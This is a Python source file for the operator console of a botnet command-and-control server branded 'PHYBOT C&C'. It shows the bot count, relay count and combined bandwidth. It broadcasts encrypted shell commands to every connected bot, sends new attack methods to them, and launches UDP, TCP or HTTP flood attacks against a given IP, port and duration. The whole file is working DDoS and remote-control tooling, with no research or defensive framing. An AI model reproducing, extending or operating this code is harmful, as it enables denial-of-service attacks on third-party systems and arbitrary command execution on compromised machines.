from os import path
from time import sleep, asctime, localtime
from socket import socket as Sock
from json import load
from pystyle import Colors, Colorate
from .config import C2Config
from .core import Core

# the client is used only for ui
class Client():
    def __init__(
        self,
        core: Core,
        config: C2Config = C2Config(),
):
        self.core = core
        self.config = config

    def prompt(
        self,
        content: str,
        srv: bool = True,
    ) -> str:
        srv_prompt: str = Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1) + self.config.COLOR_WHITE + "." + Colorate.Horizontal(Colors.blue_to_purple, "server", 1) + f"{self.config.COLOR_WHITE}("

        if srv: return srv_prompt + Colorate.Horizontal(Colors.yellow_to_red, content, 1) + f"{self.config.COLOR_WHITE})"
        return Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1) + self.config.COLOR_WHITE+ "." + Colorate.Horizontal(Colors.blue_to_purple, content, 1) + self.config.COLOR_WHITE + "/> "

    def update_title(
        self,
        client: Sock,
        username: str,
    ):
        while 1:
            try:
                bot_number: int = self.config.bot_count
                relay_number: int = len(self.config.relays_sock)
                total_speed: int = self.config.bot_speed / 125000
                actual_time: str = asctime(localtime())
                self.core.send(client, f'\33]0;{username}@PHYBOT C&C  |  Bots: {bot_number}  |  Relay: {relay_number}  |  Speed: {total_speed} Gbps  |  {actual_time}\a', False)

                sleep(self.config.cnc_time.UPTITLE)

            except Exception as e:
                client.close()
                self.core.log(f"update_title error: {e}")

    def command_line(
        self,
        client: Sock,
        username: str,
    ):
        # send banner message
        for banner_part in self.config.banner.split('\n'): self.core.send(client, banner_part)

        self.core.send(client, "\n")

        bot_number: int = self.config.bot_count
        relay_number: int = len(self.config.relays_sock)
        total_speed: int = self.config.bot_speed/125000

        self.core.send(client, self.prompt(f"Bots: {bot_number}"))
        self.core.send(client, self.prompt(f"Relays: {relay_number}"))
        self.core.send(client, self.prompt(f"Speed: {total_speed} Gbps"))
        self.core.send(client, "\n")

        self.core.send(client, self.prompt(username, False), False)

        command_list: list[str] = []
        while 1:
            try:
                data: str = client.recv(1024).decode().strip()

                if not data: continue
                # few commands in one line impl:
                if "&" in data:
                    data_split = data.split("&")
                    data = data_split[0]
                    for cmd in data_split:
                        command_list.append(cmd)
                else: command_list.append(data)


                for data in command_list:
                    # remove every spaces in start or end of the command
                    while data.startswith(" "):
                        data = data[1:]
                    while data.endswith(" "):
                        data = data[:-1]

                    args: list[str] = data.split(' ')
                    command: str = args[0]
                    cmd: str = data

                    match command.upper():
                        case 'HELP':
                            tab: str = Colorate.Vertical(Colors.yellow_to_red, """
        ╔═══════════════╦══════════════════════════════════════════╗
        ║  HELP         ║   Shows list of commands                 ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  CMD          ║   Send an command to all bots            ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  ATTACK       ║   Start an attack                        ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  METHOD HELP  ║   List all Method commands               ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  BOTS         ║   List all the connected bots            ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  SPEED        ║   Get the speed of all bots              ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  PING         ║   Ping all relay                         ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  CLEAR        ║   Clears the screen                      ║
        ╠═══════════════╬══════════════════════════════════════════╣
        ║  LOGOUT       ║   Disconnects from CnC server            ║
        ╚═══════════════╩══════════════════════════════════════════╝

                            """, 1)
                            for x in tab.split("\n"):
                                self.core.send(client, x)

                        case 'CLEAR':
                            self.core.send(client, self.config.ANSI_CLEAR, False)
                            for x in self.config.banner.split('\n'):
                                self.core.send(client, x)

                            self.core.send(client, "\n")
                            self.core.send(client, self.prompt(f"Bots: {bot_number}"))
                            self.core.send(client, self.prompt(f"Relays: {relay_number}"))
                            self.core.send(client, self.prompt(f"Speed: {total_speed} Gbps"))
                            self.core.send(client, "\n")

                        case 'LOGOUT':
                            self.core.send(client, 'Goodbye')
                            sleep(1)
                            return
                        
                        case "CMD":
                            if len(args) == 1: self.core.send(client, self.prompt(f"CMD need <command> argument!"))
                            else:
                                relay_cmd: str = cmd
                                self.core.broadcast(self.core.crypt(relay_cmd.encode(), True))

                        case "SPEED":
                            try:
                                Core(config=self.config)._net()
                                self.core.send(client, f"{total_speed} Gbps")

                            except Exception as e: self.core.send(client, f"{self.config.COLOR_RED}[{self.config.COLOR_WHITE}!{self.config.COLOR_RED}]{self.config.COLOR_RESET} Error: {e}")

                        case "BOTS":
                            try:
                                Core(config=self.config)._getbot()
                                self.core.send(client, f"{bot_number} Bots")

                            except Exception as e: self.core.send(client, self.prompt(f"Error: {e}"))

                        case "PING": Core(config=self.config)._ping()

                        case "METHOD":
                            try:
                                if len(args) == 1: self.core.send(client, self.prompt(f"METHOD need <name> arguments!"))
                                else:
                                    method_arg = cmd.replace("METHOD ", "")
                                    method_args = method_arg.split(" ")

                                    match method_args[0].upper():
                                        case 'CREATE':
                                            if len(args) < 4: self.core.send(client, self.prompt(f"METHOD CREATE need <name> and <command> arguments!"))
                                            else:
                                                self.core.broadcast(self.core.crypt(cmd.encode()))
                                                name = method_args[1]
                                                method_cmd = method_arg.replace("CREATE ", "").replace(f"{name} ", "")

                                                with open("method.json", "r") as f:
                                                    tb1: str = load(f)
                                                    tb1 = tb1.replace('{"', '"').replace("{}", "").replace("}    ", "") # here i remind that spaces are useful
                                                    tb = f'"{name}": {{"name": "{name}", "command": "{method_cmd}"}}'

                                                if not tb1 is None: tb="{"+tb1+",\n"+tb+"\n}    "
                                                else: tb = "{"+tb+"\n}    "

                                                tb = tb.replace("{{", "{").replace("}}", "}")

                                                with open("method.json", "w") as f:
                                                    f.write(tb.replace("'", '"').replace("{,", "{"))

                                        case 'CLEAR':
                                            self.core.broadcast(cmd)
                                            with open("method.json", "w") as f:
                                                f.write("{}")
                                                
                                        case 'HELP':
                                            tab: str = Colorate.Vertical(Colors.yellow_to_red, """
        ╔══════════════════╦══════════════════════════════════════════╗
        ║  METHOD CREATE   ║   Send a new ATTACK method to all bots   ║
        ╠══════════════════╬══════════════════════════════════════════╣
        ║  METHOD CLEAR    ║   Clear all methods                      ║
        ╠══════════════════╬══════════════════════════════════════════╣
        ║  METHOD <name>   ║   Start an attack with your method       ║
        ╠══════════════════╬══════════════════════════════════════════╣
        ║  METHODS         ║   List all methods                       ║
        ╚══════════════════╩══════════════════════════════════════════╝

                                            """, 1)
                                            for x in tab.split("\n"):
                                                self.core.send(client, x)
                                                
                                        case _:
                                            self.core.broadcast(self.core.crypt(method_cmd.encode()))
                                            self.core.send(client, self.prompt(f"Command {method_args[0]} send to all bots!"))

                            except Exception as e: self.core.send(client, self.prompt(f"Error: {e}"))

                        case "METHODS":
                            methods_arg: str = cmd.replace("METHOD ", "")
                            methods_args = methods_arg.split(" ")

                            name: str = methods_args[0]

                            if path.exists("method.json"):
                                with open("method.json", "r") as f:
                                    d: str = load(f)
                                    for (key, val) in d.items():
                                        self.core.send(client, f"{key}: {val['command']}")

                            else:
                                with open("method.json", "w") as f:
                                    f.write("{}")
                                self.core.send(client, self.prompt(f"Nothing found"))

                        case 'ATTACK':
                            try:
                                attack_arg: str = cmd.replace("ATTACK ", "")
                                attack_args: list[str] = attack_arg.split(" ")

                                if len(attack_args) < 4: self.core.send(client, self.prompt(f"ATTACK need <ip> <port> <attack time> <UDP or TCP or HTTP> arguments!"))

                                else:
                                    attack_ip: str = attack_args[0]
                                    attack_port: str = attack_args[1]
                                    tps: str = attack_args[2]
                                    method: str = attack_args[3]
                                    attack_cmd: str = f"{attack_ip}:{attack_port}/{tps}-{method}"

                                    self.core.broadcast(self.core.crypt(attack_cmd.encode()))
                                    Core(config=self.config)._net()

                                    self.core.send(client, self.prompt(f"Bots: {bot_number}", 1))
                                    self.core.send(client, self.prompt(f"Attack IP: {attack_ip}", 1))
                                    self.core.send(client, self.prompt(f"Attack Port: {attack_port}", 1))
                                    self.core.send(client, self.prompt(f"Attack Time: {tps}", 1))
                                    self.core.send(client, self.prompt(f"Attack Method: {method}", 1))
                                    self.core.send(client, self.prompt(f"Attack Speed: {total_speed} Gbps", 1))
                                    self.core.send(client, "\n")

                            except Exception as e: self.core.send(client, self.prompt(f"Attack Error: {e}"))

                        case _: self.core.send(client, self.prompt("Unknown Command"))

                command_list.clear()
                self.core.send(client, self.prompt(username, False), False)

            except Exception as e: 
                self.core.log(f"\n\n{e}\n\n")
                break

        client.close()
